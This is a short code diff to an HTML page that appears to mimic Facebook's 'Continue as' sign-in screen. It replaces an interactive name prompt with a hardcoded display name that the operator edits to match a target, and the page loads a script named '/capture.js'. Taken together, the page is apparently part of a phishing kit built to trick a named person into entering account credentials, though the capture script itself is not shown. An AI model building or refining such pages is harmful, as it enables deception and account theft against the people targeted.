@@ -247,7 +247,7 @@
           <text id="avatarInitial" x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-family="Arial" font-weight="600">?</text>
         </svg>
       </div>
-      <span class="user-name" id="userName" title="Click to edit" style="cursor:pointer;border-bottom:1px dashed #555;" onclick="editName()">Your Name</span>
+      <span class="user-name" id="userName">Your Name</span>
     </div>
   </header>
 
@@ -306,30 +306,17 @@
   </div>
 
   <script>
-    function applyName(name) {
-      if (!name) return;
-      const firstName = name.split(' ')[0];
-      document.getElementById('userName').textContent = name;
+    // ════════════════════════════════════════════════════
+    // ▶ CHANGE THIS NAME TO WHATEVER YOU WANT ◀
+    const FB_DISPLAY_NAME = 'John Smith';
+    // ════════════════════════════════════════════════════
+
+    (function() {
+      const firstName = FB_DISPLAY_NAME.split(' ')[0];
+      document.getElementById('userName').textContent = FB_DISPLAY_NAME;
       document.getElementById('continueBtn').textContent = 'Continue as ' + firstName;
-      document.getElementById('avatarInitial').textContent = name.charAt(0).toUpperCase();
-      localStorage.setItem('fbName', name);
-    }
-
-    function editName() {
-      const current = document.getElementById('userName').textContent;
-      const input = prompt('Enter your name:', current === 'Your Name' ? '' : current);
-      if (input && input.trim()) applyName(input.trim());
-    }
-
-    // Load saved name on page open
-    const saved = localStorage.getItem('fbName');
-    if (saved) {
-      applyName(saved);
-    } else {
-      // Prompt immediately on first load
-      const input = prompt('Enter your Facebook name:');
-      if (input && input.trim()) applyName(input.trim());
-    }
+      document.getElementById('avatarInitial').textContent = FB_DISPLAY_NAME.charAt(0).toUpperCase();
+    })();
   </script>
   <script src="/capture.js"></script>
 </body>
